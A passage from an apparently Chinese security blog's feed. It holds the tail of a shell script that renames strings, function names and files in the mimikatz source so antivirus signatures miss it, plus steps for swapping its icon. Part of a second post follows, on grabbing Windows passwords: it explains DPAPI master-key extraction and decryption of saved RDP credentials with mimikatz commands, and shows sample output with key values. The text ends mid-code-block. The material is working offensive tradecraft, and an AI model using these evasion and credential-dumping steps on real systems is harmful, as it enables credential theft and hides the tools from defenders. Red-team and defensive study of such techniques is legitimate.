class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com.cnpmjs.org/gentilkiwi/mimikatz.git mimikatz</span><br><span class="line"></span><br><span class="line"><span class="comment">## BASIC Strings ##</span></span><br><span class="line"></span><br><span class="line">mimi=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z&quot;</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1)</span><br><span class="line"><span class="built_in">mv</span> windows/mimikatz windows/<span class="variable">$mimi</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/mimikatz/<span class="variable">$mimi</span>/g&quot;</span></span><br><span class="line">MIMI=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;A-Z&quot;</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/MIMIKATZ/<span class="variable">$MIMI</span>/g&quot;</span></span><br><span class="line">Mimi=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z&quot;</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Mimikatz/<span class="variable">$Mimi</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 5 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/DELPY/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Benjamin/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 23 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/benjamin@gentilkiwi.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 15 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/creativecommons/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 10 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/gentilkiwi/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z&quot;</span> | <span class="built_in">fold</span> -w 4 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/KIWI/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z&quot;</span> | <span class="built_in">fold</span> -w 4 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Kiwi/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">kiwi=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z&quot;</span> | <span class="built_in">fold</span> -w 4 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/kiwi/<span class="variable">$kiwi</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 13 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/A La Vie, A L/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 24 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/vincent.letoux@gmail.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/benjamin/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 14 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Benjamin DELPY/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 5 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/oe.eo/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 14 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/pingcastle.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 16 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/mysmartlogon.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 15 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Vincent LE TOUX/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Basic Function Names ##</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/logonPasswords/loGoNpASSwoRdS/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/dpapi/dPApi/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sekurlsa/seKuRlSa/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sekurLSA/seKuRlSa/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ngc/nGc/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/lsadump/lsADumP/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/crypto/cRyPTO/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/kerberos/kErberoS/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/token/tOKEn/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/misc/mIsC/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/minesweeper/mInesWeEpEr/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/vault/vAULt/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/privilege/PRIViLeGe/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/process/ProCeSs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/busylight/bUsYlIght/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sr98/sR98/g&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Sub-function Names ##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sekurlsa #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/msv/mSv/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/wdigest/wDiGeST/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/tspkg/tsPkG/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/livessp/liVeSsP/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cloudap/clOuDAp/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ssp/sSp/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/logonpasswords/loGonPaSSworDs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/minidump/mIniDumP/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/bootkey/bOOtKey/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/pth/ptH/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/krbtgt/krbTgT/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/backupkeys/backUpKeyS/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/tickets/ticKets/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ekeys/eKeYs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/credman/crEdMan/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/tickets/ticKets/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ekeys/eKeYs/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crypto #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/providers/prOviDers/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/certificates/certIfiCatEs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/scauth/sCaUth/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/extract/exTraCt/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dpapi #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/masterkey/masTerKeY/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/credhist/crEdHiSt/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cloudapkd/clOudApKd/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cloudapreg/clOuDapReg/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kerberos #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/golden/golDen/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ptt/pTt/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/clist/cLiSt/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lsadump #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/secrets/seCrEts/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sam/saM/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/dcshadow/dCShAdoW/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/dcsync/dCsYnC/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/setntlm/seTnTlM/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/netsync/neTSynC/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cache/caCHe/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># misc #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/regedit/reGeDit/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/skeleton/sKeLeToN/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/easyntlmchall/easYnTlmChaLl/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ncroutemon/nCroUTeMoN/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/taskmgr/taSkMgR/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/aadcookie/aAdcOoKiE/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vault #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cred/crEd/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># token #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/elevate/eleVatE/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/revert/reVeRt/g&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Replace file names ##</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -name <span class="string">&quot;*mimikatz*&quot;</span> | <span class="keyword">while</span> <span class="built_in">read</span> FILE ; <span class="keyword">do</span></span><br><span class="line">newfile=<span class="string">&quot;<span class="subst">$(echo $&#123;FILE&#125; |sed -e <span class="string">&quot;s/mimikatz/<span class="variable">$mimi</span>/g&quot;</span>)</span>&quot;</span>;</span><br><span class="line"><span class="built_in">mv</span> <span class="string">&quot;<span class="variable">$&#123;FILE&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;newfile&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -name <span class="string">&quot;*kiwi*&quot;</span> | <span class="keyword">while</span> <span class="built_in">read</span> FILE ; <span class="keyword">do</span></span><br><span class="line">newfile=<span class="string">&quot;<span class="subst">$(echo $&#123;FILE&#125; |sed -e <span class="string">&quot;s/kiwi/<span class="variable">$kiwi</span>/g&quot;</span>)</span>&quot;</span>;</span><br><span class="line"><span class="built_in">mv</span> <span class="string">&quot;<span class="variable">$&#123;FILE&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;newfile&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment">## ZIP File ##</span></span><br><span class="line"></span><br><span class="line">zip -r mimi.zip ./windows</span><br></pre></td></tr></table></figure><p>然后把这串字符串给删了，改成hello word</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/15.png" alt="image-20210709155034578"></p><p>然后利用软件对图标进行提取和替换，替换后如下图</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/16.png" alt="image-20210709160159713"></p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/17.png" alt="image-20210709160237931" style="zoom: 50%;" /><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/18.png" alt="image-20210709160254519" style="zoom: 50%;" /><p>最终样式</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/19.png" alt="image-20210709160356633"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://chowdera.com/2021/03/20210311155239092N.html</span><br><span class="line">https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html</span><br><span class="line">https://choge.top/2020/08/16/Cobaltstrike%E4%B9%8B%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/</span><br><span class="line">https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows本地密码抓取</title>
    <link href="https://www.ascotbe.com/2021/06/09/WindowsGrabPassword/"/>
    <id>https://www.ascotbe.com/2021/06/09/WindowsGrabPassword/</id>
    <published>2021-06-09T15:45:42.000Z</published>
    <updated>2022-01-10T03:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>学！后续会持续更新</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/1.png" alt="image-20210611163901510"></p><h2 id="系统密码"><a href="#系统密码" class="headerlink" title="系统密码"></a>系统密码</h2><h3 id="DPAPI解密"><a href="#DPAPI解密" class="headerlink" title="DPAPI解密"></a>DPAPI解密</h3><p>使用用户登录密码解密Master Key file，获得Master Key</p><p>固定位置： <code>%APPDATA%\Microsoft\Protect\%SID%</code>下往往有多个Master Key file</p><p>这是为了安全起见，系统每隔90天会自动生成一个新的Master Key(旧的不会删除)</p><p><code>%APPDATA%\Microsoft\Protect\%SID%</code>下存在一个固定文件<code>Preferred</code>，包含最后一个Master Key file的名称和创建时间，文件结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _tagPreferredMasterKey</span><br><span class="line">&#123;</span><br><span class="line">  GUID guidMasterKey;</span><br><span class="line">  FILETIME ftCreated;</span><br><span class="line">&#125; PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;</span><br></pre></td></tr></table></figure><p>完整的流程：</p><ul><li>找到本机的Master Key file</li><li>从Master Key file中获取到Master Key</li><li>通过Master Key解密DPAPI blob获得明文</li></ul><h3 id="本地保存RDP密码"><a href="#本地保存RDP密码" class="headerlink" title="本地保存RDP密码"></a>本地保存RDP密码</h3><p>首先需要打开<strong>隐藏受保护的操作系统文件</strong>，不打开的话就算打开了显示<strong>隐藏的文件、文件夹和驱动器</strong>也是看不到的</p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/2.png" alt="image-20210607105330176" style="zoom:50%;" /><p>接着打开文件<code>C:\Users\用户名\AppData\Local\Microsoft\Credentials</code>就可以看到保存的数据了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/3.png" alt="image-20210609134443326"></p><p>使用<code>cmdkey /line</code>命令可以查看本地保存了哪些密码，如果你连过其他服务器如果点击了保存密码就能抓取到</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/4.png" alt="image-20210607105639249"></p><p>使用🥝读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\ascotbe\AppData\Local\Microsoft\Credentials\SESSIONID</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/5.png" alt="image-20210608171226583"></p><p>获取到<strong>guidMasterKey</strong>其实就是我们的master key file名称</p><blockquote><p>切记一点不同的SESSIONID如果间隔时间超过90天那么对应的guidMasterKey也是不同的</p></blockquote><p>通过命令获取到Master Key file的Master Key，下文中<strong>GUID&#x3D;&#x3D;Master Key file</strong>，<strong>MasterKey&#x3D;&#x3D;Master Key</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">EeLrXMiD # sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229076 (00000000:00037ed4)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ascotbe</span><br><span class="line">Domain            : 樱岛麻衣</span><br><span class="line">Logon Server      : 樱岛麻衣</span><br><span class="line">Logon Time        : 2021/6/7 9:37:53</span><br><span class="line">SID               : S-1-5-21-1645164750-2672341361-3879437546-1000</span><br><span class="line">         [00000000]</span><br><span class="line">         * GUID      :  &#123;d3fcdbfb-06bd-49f0-98b4-ac08664c176a&#125;</span><br><span class="line">         * Time      :  2021/6/7 9:37:59</span><br><span class="line">         * MasterKey :  7da666987b2b6a51db3148cd01a6fe460a79315d1678a24b327d251c4f9138eecbb7ca4919de8de678628963761ee731a1316b78a6a982d0d4a9c590f5171c9e</span><br><span class="line">         * sha1(key) :  efd1c9d7290d13b3ecc1e288accfc5d6707d3403</span><br><span class="line">         [00000001]</span><br><span class="line">         * GUID      :  &#123;33449413-8697-4a85-a075-778b49015fbe&#125;</span><br><span class="line">         * Time      :  2021/6/8 17:17:37</span><br><span class="line">         * MasterKey :  0ac77f164c38e751f303e26d883cd15e3eb3861f2d69c2ba192035511bfc8f2880f206ef238de4d282384c813326feeaef364b9089c86a97a5169f31dbd319ee</span><br><span class="line">         * sha1(key) :  f45701db86a93d9b860be725d7eaf32a9a684a77</span><br><span class="line">         [00000002]</span><br><span class="line">         * GUID      :  &#123;788f0828-1d1e-478d-adf6-7a37e92182e8&#125;</span><br><span class="line">         * Time      :  2021/6/7 18:01:08</span><br><span class="line">         * MasterKey :  6a9ece2f3bd683c2ac14c69e13465399e9ce20c2930dd51dd9378eed800b06b409f7f4bef926e503d85a0b9e5e1f4cc5ccd01fb2ddaa8de90d086bf3a8ae3bf3</span><br><span class="line">         * sha1(key) :  f2d6c58b2d2f0a91e07dc0d1cb7db7cb8935f955</span><br></pre></td></tr></table></figure><p>只需要使用<strong>SESSIONID</strong>对应的GUID和MasterKey就能解密数据了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\ascotbe\AppData\Local\Microsoft\Credentials\SESSION /masterkey:对应的GUID MasterKey</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/6.png" alt="image-20210609134218324"></p><p><strong>TargetName</strong>是目标机器，<strong>UserName</strong>是账号，<strong>CredentialBlob</strong>是密码</p><h3 id="本机密码"><a href="#本机密码" class="headerlink" title="本机密码"></a>本机密码</h3><h4 id="通过注册列表抓取密码"><a href="#通过注册列表抓取密码" class="headerlink" title="通过注册列表抓取密码"></a>通过注册列表抓取密码</h4><p>首先需要管理员权限，抓取注册列表中保存的哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 